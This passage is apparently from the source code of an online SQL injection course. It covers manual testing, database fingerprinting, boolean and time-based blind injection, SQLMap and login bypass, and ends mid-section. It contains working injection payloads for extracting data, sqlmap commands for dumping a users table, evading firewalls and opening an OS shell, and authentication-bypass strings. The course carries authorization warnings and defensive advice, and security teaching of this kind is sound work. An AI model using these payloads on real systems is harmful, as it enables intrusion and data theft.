              <p class="text-gray-300 mb-4">Manual testing focuses on observing how an application behaves when different inputs are provided. By carefully modifying parameters and analyzing responses, testers can determine whether user input is being directly included in SQL queries.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Key Indicators of SQL Injection</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Visible Signs</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Database error messages</li>
                    <li>Page content changes</li>
                    <li>Authentication bypass</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Subtle Signs</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Unexpected application behavior</li>
                    <li>Response delays (Time-based)</li>
                    <li>Missing data in response</li>
                  </ul>
                </div>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Manual Testing Stages</h4>
              <ol class="list-decimal list-inside text-gray-300 space-y-2 mb-4">
                <li>Identifying injectable input points (URL, forms, headers)</li>
                <li>Breaking the SQL query logic (syntax errors)</li>
                <li>Confirming SQL Injection vulnerability (logical tests)</li>
                <li>Determining the database type</li>
                <li>Extracting information carefully</li>
              </ol>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why Manual Testing Wins</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300 mb-2">In real‑world bug bounty programs, many high‑impact SQL Injection findings are discovered manually because:</p>
                <ul class="list-disc list-inside text-gray-300 space-y-1">
                  <li>Automated scanners are often blocked by WAFs</li>
                  <li>Scanners produce noisy traffic patterns</li>
                  <li>Manual testing mimics legitimate user behavior</li>
                  <li>Testers can adapt to complex application logic</li>
                </ul>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: Burp Suite',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Manual Testing Techniques</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands and techniques are for authorized testing, labs, and ethical security research only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Tool Setup</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <code class="text-green-400 block mb-1 font-mono text-sm">burpsuite</code>
                    <p class="text-sm text-gray-400">Launches Burp Suite to intercept and modify HTTP requests.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Testing for SQL Injection Manually</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm">'</code>
                      <p class="text-sm text-gray-400"><strong>Basic Quote Test:</strong> Injected into parameters to check for SQL syntax errors.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm">' OR '1'='1</code>
                      <p class="text-sm text-gray-400"><strong>Logical Test:</strong> Tests authentication bypass or confirms input affects query logic.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm">' OR '1'='2</code>
                      <p class="text-sm text-gray-400"><strong>False Condition Test:</strong> Should return no results (or different results). Used for comparison.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Advanced Enumeration</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="text-green-400 font-mono text-sm mb-1">
                        ' ORDER BY 1--<br/>
                        ' ORDER BY 2--<br/>
                        ' ORDER BY 3--
                      </div>
                      <p class="text-sm text-gray-400"><strong>Determining Number of Columns:</strong> Increment until an error occurs to identify column count.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm">' UNION SELECT null, null--</code>
                      <p class="text-sm text-gray-400"><strong>Union‑Based Manual Test:</strong> Tests UNION injection. Adjust number of columns as needed.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm">' UNION SELECT database(), user()--</code>
                      <p class="text-sm text-gray-400"><strong>Data Extraction:</strong> Extracts database name and user (works only if output is visible).</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive & Secure Coding View</h4>
                  <ul class="list-disc list-inside text-gray-300 space-y-1">
                    <li>Use <strong>Parameterized Queries</strong> (Prepared Statements)</li>
                    <li>Implement strict <strong>Input Validation</strong></li>
                    <li>Avoid dynamic SQL generation</li>
                    <li>Ensure proper error handling (disable verbose errors)</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Database Fingerprinting',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">What is Database Fingerprinting?</h4>
              <p class="text-gray-300 mb-4">Database fingerprinting is the process of identifying the type, version, and configuration of a database in a target system during a penetration test or SQL Injection assessment. Knowing the exact database allows attackers or pentesters to tailor SQL injection techniques or queries effectively.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Key Points</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-2 mb-4">
                <li><strong class="text-white">Purpose:</strong> To determine the underlying database management system (DBMS) – e.g., MySQL, PostgreSQL, Oracle, Microsoft SQL Server.</li>
                <li><strong class="text-white">Importance:</strong>
                  <ul class="list-disc list-inside ml-4 mt-1 text-gray-400">
                    <li>Helps in crafting specific SQL injection payloads.</li>
                    <li>Allows testing for DBMS-specific vulnerabilities.</li>
                    <li>Facilitates choosing the right automated tools or scripts for exploitation.</li>
                  </ul>
                </li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Techniques</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Active Fingerprinting</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li><strong>Error-based:</strong> Trigger database errors to reveal the DBMS type.</li>
                    <li><strong>Banner grabbing:</strong> Extracting DBMS version info using network or web queries.</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Inference & Probing</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li><strong>Time-based:</strong> Using database-specific queries to measure response times.</li>
                    <li><strong>Manual probing:</strong> Sending crafted queries to check syntax differences.</li>
                  </ul>
                </div>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Commonly Fingerprinted Databases</h4>
              <div class="flex flex-wrap gap-2 mb-4">
                <span class="bg-[#2d2d2d] text-green-400 px-3 py-1 rounded text-sm border border-[#333]">MySQL</span>
                <span class="bg-[#2d2d2d] text-blue-400 px-3 py-1 rounded text-sm border border-[#333]">PostgreSQL</span>
                <span class="bg-[#2d2d2d] text-red-400 px-3 py-1 rounded text-sm border border-[#333]">Oracle</span>
                <span class="bg-[#2d2d2d] text-yellow-400 px-3 py-1 rounded text-sm border border-[#333]">Microsoft SQL Server</span>
                <span class="bg-[#2d2d2d] text-gray-400 px-3 py-1 rounded text-sm border border-[#333]">SQLite</span>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Real-World Example</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300">A login form is vulnerable to SQL injection. By sending specific payloads and observing responses or errors, the tester can determine that the backend uses <span class="text-green-400">MySQL 8.0</span>, which helps in crafting further injection queries.</p>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Commands / Tools',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Database Fingerprinting Tools</h4>
                  <p class="text-gray-300 mb-4">Here’s how you can perform database fingerprinting using Kali Linux tools:</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Using sqlmap</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Basic DBMS Fingerprinting</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://targetsite.com/vulnerable.php?id=1" --dbs --banner</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Fingerprint Only (No Dump)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://targetsite.com/vulnerable.php?id=1" --banner</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Manual Banner Grabbing with Nmap</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Scan MySQL</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -p 3306 --script=mysql-info target_ip</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Scan PostgreSQL</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nmap -p 5432 --script=postgresql-info target_ip</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Using Netcat (nc)</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Grab MySQL Banner</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nc target_ip 3306</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Grab PostgreSQL Banner</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">nc target_ip 5432</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Web App DBMS Detection</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <h5 class="text-white font-medium mb-1 text-sm">Using WhatWeb</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">whatweb http://targetsite.com</code>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Manual Error-Based Fingerprinting</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <h5 class="text-white font-medium mb-1 text-sm">Using Curl</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">curl "http://targetsite.com/vulnerable.php?id=1'"</code>
                    <p class="text-sm text-gray-400">Sending a single quote to trigger DB error.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Notes</h4>
                  <ul class="list-disc list-inside text-gray-300 space-y-1">
                    <li>Tools like <strong>sqlmap</strong> automate most of the fingerprinting process.</li>
                    <li>Manual methods like banner grabbing help when automated tools are blocked or detected.</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Boolean‑Based Blind SQL Injection',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">What is Boolean‑Based Blind SQL Injection?</h4>
              <p class="text-gray-300 mb-4">Boolean‑Based Blind SQL Injection is used when an application is vulnerable to SQL injection but does not display database errors or output. Instead of seeing data directly, the attacker infers information based on true or false responses from the application.</p>
              <p class="text-gray-300 mb-4">The core idea is simple:</p>
              <ul class="list-disc list-inside text-gray-300 space-y-1 mb-4">
                <li>If a condition is <strong class="text-green-400">true</strong>, the page behaves normally</li>
                <li>If a condition is <strong class="text-red-400">false</strong>, the page response changes</li>
              </ul>
              <p class="text-gray-300">By carefully crafting logical conditions, attackers can extract database information one bit or character at a time.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common Scenarios</h4>
              <p class="text-gray-300 mb-2">This technique is very common in real‑world applications, especially those using:</p>
              <ul class="list-disc list-inside text-gray-300 space-y-1 mb-4">
                <li>Custom error handling</li>
                <li>Suppressed DB error messages</li>
                <li>WAF‑protected environments</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">How It Works</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <ol class="list-decimal list-inside text-gray-300 space-y-2">
                  <li>Identify an injectable parameter</li>
                  <li>Inject a boolean condition (e.g., AND 1=1)</li>
                  <li>Observe response differences</li>
                  <li>Use logic to guess data (e.g., Is first letter 'a'?)</li>
                  <li>Repeat until data is extracted</li>
                </ol>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Challenges & Defense</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Challenges</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Slow data extraction</li>
                    <li>Requires many requests</li>
                    <li>Easily logged</li>
                    <li>WAF detection risk</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Prevention</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Use prepared statements</li>
                    <li>Parameterized queries</li>
                    <li>Input validation</li>
                    <li>Least privilege DB access</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Practical Payloads',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Blind SQL Injection Payloads</h4>
                  <p class="text-gray-300 mb-4">⚠️ Strictly for ethical labs and authorized testing.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Confirming Blind SQL Injection</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND 1=1--</code>
                      <p class="text-sm text-gray-400">✔ Page loads normally (True condition)</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND 1=2--</code>
                      <p class="text-sm text-gray-400">✖ Page behaves differently (False condition)</p>
                    </div>
                    <p class="text-sm text-gray-400 mt-2">This difference confirms a boolean‑based blind SQLi vulnerability.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Data Extraction (MySQL)</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Extracting Database Name</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND SUBSTRING(database(),1,1)='a'--</code>
                      <p class="text-sm text-gray-400">If response is normal → condition is true. Change character until matched.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Extracting Database Length</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND LENGTH(database())=5--</code>
                      <p class="text-sm text-gray-400">Increase/decrease number until true.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Advanced Enumeration</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Extracting Table Names</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Character‑by‑Character Logic</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND ASCII(SUBSTRING(database(),1,1))>100--</code>
                      <p class="text-sm text-gray-400">Helps speed up guessing using binary logic (greater than / less than).</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Blind SQLi Workflow</h4>
                  <ol class="list-decimal list-inside text-gray-300 space-y-1 text-sm">
                    <li>Find injectable input</li>
                    <li>Confirm boolean behavior</li>
                    <li>Identify DBMS</li>
                    <li>Get database length</li>
                    <li>Extract database name</li>
                    <li>Enumerate tables & columns</li>
                    <li>Extract sensitive data</li>
                  </ol>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Time‑Based Blind SQL Injection',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">What is Time‑Based Blind SQL Injection?</h4>
              <p class="text-gray-300 mb-4">Time‑Based Blind SQL Injection is an advanced form of SQL injection used when an application does not return database errors, output, or visible true/false differences. In such cases, the attacker relies entirely on response time delays to determine whether an injected condition is true or false.</p>
              <p class="text-gray-300 mb-4">Instead of changing page content, the database is instructed to pause execution for a specific amount of time when a condition evaluates to true. By measuring the delay in the server’s response, attackers can infer sensitive database information.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why It Works & Prevalence</h4>
              <p class="text-gray-300 mb-2">This technique is extremely powerful and widely applicable because:</p>
              <ul class="list-disc list-inside text-gray-300 space-y-1 mb-4">
                <li>Many modern applications suppress errors</li>
                <li>Output‑based SQL injection is often blocked</li>
                <li>Time delays are harder to mask without proper protections</li>
              </ul>
              <p class="text-gray-300">Time‑based SQL injection is commonly seen in production systems, especially APIs and backend services.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Core Working Principle</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
                <ul class="space-y-2 mb-4">
                  <li class="flex items-center"><span class="text-green-400 font-mono mr-2">Condition is true</span> <span class="text-gray-300">→ server response is delayed</span></li>
                  <li class="flex items-center"><span class="text-red-400 font-mono mr-2">Condition is false</span> <span class="text-gray-300">→ response is immediate</span></li>
                </ul>
                <p class="text-gray-300">By repeating delayed queries, attackers can extract:</p>
                <ul class="list-disc list-inside text-gray-300 space-y-1 mt-2 text-sm">
                  <li>Database name</li>
                  <li>Table names</li>
                  <li>Column names</li>
                  <li>User credentials</li>
                </ul>
                <p class="text-gray-400 text-sm mt-2">One character at a time.</p>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Limitations & Risks</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Limitations</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Very slow extraction</li>
                    <li>High number of requests</li>
                    <li>Easy to detect via logs</li>
                    <li>Can trigger IDS/IPS systems</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Defensive Measures</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Prepared statements</li>
                    <li>Disable dangerous DB functions</li>
                    <li>Query time limits</li>
                    <li>Web Application Firewalls</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Time‑Based SQL Injection Payloads',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Time‑Based Payloads</h4>
                  <p class="text-gray-300 mb-4">⚠️ Use only in legal labs and authorized testing environments.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">MySQL Payloads</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Confirming Vulnerability</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND SLEEP(5)--</code>
                      <p class="text-sm text-gray-400">✔ Page responds after ~5 seconds → vulnerable</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Conditional Delay Test</h5>
                      <div class="text-green-400 font-mono text-sm mb-1">
                        ' AND IF(1=1,SLEEP(5),0)--<br/>
                        ' AND IF(1=2,SLEEP(5),0)--
                      </div>
                      <p class="text-sm text-gray-400">Only the first causes delay, confirming logic execution.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Data Extraction (MySQL)</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Extracting Database Name Character</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--</code>
                      <p class="text-sm text-gray-400">Delay means condition is true.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Extracting Database Length</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND IF(LENGTH(database())=6,SLEEP(5),0)--</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Binary Search Technique (Faster)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(5),0)--</code>
                      <p class="text-sm text-gray-400">Helps reduce requests by narrowing character range.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Other Databases</h4>
                  <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">PostgreSQL</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">' AND CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">SQL Server (MSSQL)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '00:00:05'--</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Typical Attack Workflow</h4>
                  <ol class="list-decimal list-inside text-gray-300 space-y-1 text-sm">
                    <li>Identify injectable parameter</li>
                    <li>Confirm time delay behavior</li>
                    <li>Detect DBMS</li>
                    <li>Measure baseline response time</li>
                    <li>Extract database metadata</li>
                    <li>Enumerate tables and columns</li>
                    <li>Extract sensitive data</li>
                  </ol>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Automating SQL Injection with SQLMap',
        duration: '15 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">Why Use SQLMap?</h4>
              <p class="text-gray-300 mb-4">SQLMap is the most popular open‑source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. While manual testing is essential for understanding logic, SQLMap is critical for:</p>
              <ul class="list-disc list-inside text-gray-300 space-y-1 mb-4">
                <li>Speeding up the exploitation process</li>
                <li>Dumping large amounts of data</li>
                <li>Bypassing Web Application Firewalls (WAF)</li>
                <li>Gaining OS‑level access (shell)</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Core Features</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, etc.</li>
                <li>Six SQLi techniques: Boolean‑blind, Time‑blind, Error‑based, UNION, Stacked queries, and Out‑of‑band.</li>
                <li>Password hash dumping and cracking via dictionary attack.</li>
                <li>File system access (upload/download files).</li>
                <li>OS command execution via out‑of‑band connections.</li>
              </ul>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">When to Use SQLMap</h4>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <p class="text-gray-300 mb-2"><strong>Best for:</strong></p>
                <ul class="list-disc list-inside text-gray-300 space-y-1 ml-2">
                  <li>Confirming vulnerabilities found manually</li>
                  <li>Extracting full databases quickly</li>
                  <li>Testing complex blind injection scenarios</li>
                  <li>Checking for WAF bypass possibilities</li>
                </ul>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Ethical Warning</h4>
              <p class="text-gray-300 text-sm">SQLMap is extremely noisy and aggressive. Running it against production servers without permission is illegal and easily detected. Always use <code>--risk=1</code> and <code>--level=1</code> unless authorized for deeper testing.</p>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'SQLMap Commands',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">SQLMap Command Cheat Sheet</h4>
                  <p class="text-gray-300 mb-4">⚠️ Use strictly on authorized targets.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Basic Usage</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <h5 class="text-white font-medium mb-1 text-sm">Standard Scan</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://target.com/vuln.php?id=1" --batch</code>
                    <p class="text-sm text-gray-400">Scans the URL and automatically answers "yes" to prompts.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Data Extraction</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">List Databases</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "URL" --dbs</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">List Tables in a Database</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "URL" -D target_db --tables</code>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Dump Table Data</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "URL" -D target_db -T users --dump</code>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Advanced Options</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Bypassing WAF (Tamper Scripts)</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "URL" --tamper=space2comment,between</code>
                      <p class="text-sm text-gray-400">Obfuscates payloads to evade firewalls.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-medium mb-1 text-sm">Aggressive Scanning</h5>
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "URL" --level=5 --risk=3</code>
                      <p class="text-sm text-gray-400">Tests all headers/cookies. High risk of crashing service.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Operating System Takeover</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <h5 class="text-white font-medium mb-1 text-sm">OS Shell Access</h5>
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "URL" --os-shell</code>
                    <p class="text-sm text-gray-400">Attempts to upload a shell and provide a command prompt.</p>
                  </div>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Bypassing Login Panels',
        duration: '20 min',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">Bypassing Login Panels</h4>
              <p class="text-gray-300 mb-4">Bypassing login panels is a technique used during penetration testing to gain unauthorized access to web applications by exploiting weak authentication mechanisms. It is often tested legally in bug bounty programs or penetration tests to identify vulnerabilities.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Key Points</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Purpose</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>To identify weaknesses in login mechanisms.</li>
                    <li>To understand how attackers may exploit these weaknesses.</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Precautions for Pentesters</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>Always have legal authorization.</li>
                    <li>Avoid causing service disruption.</li>
                  </ul>
                </div>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Common Techniques</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-2 mb-4">
                <li><strong class="text-white">SQL Injection:</strong> Entering SQL payloads in login forms to bypass authentication.
                  <br/><span class="text-sm text-gray-400 ml-4">Example: <code>admin' OR '1'='1</code></span>
                </li>
                <li><strong class="text-white">Default Credentials:</strong> Trying default usernames and passwords (e.g., admin/admin).</li>
